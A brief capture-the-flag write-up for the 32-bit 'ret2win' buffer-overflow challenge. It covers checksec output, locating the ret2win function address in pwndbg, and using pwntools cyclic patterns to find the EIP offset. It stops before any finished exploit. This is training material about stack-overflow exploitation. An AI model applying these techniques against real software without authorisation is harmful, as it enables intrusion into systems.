# ret2win
## 32 bit
File check
```bash
file ret2win32
```
32bit ELF LSB

Check with checksec
```bash
checksec --file=ret2win32
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72) Symbols	  No	0		3		ret2win32
```
No canary, partial relro, no pie and nx enabled.

Run file in gdb-pwndbg and list functions.
```bash
gdb-pwndbg ret2win
pwndbg> info functions
```
memory location of `ret2win` : `0x0804862c`
Find buffer size.
```bash
python3
>>> from pwn import *
>>> g = cyclic_gen()
>>> g.get(100)
```
Put the payload into the program run in pwndbg and get the value of the EIP (cause 32bit)
```
laaa
```
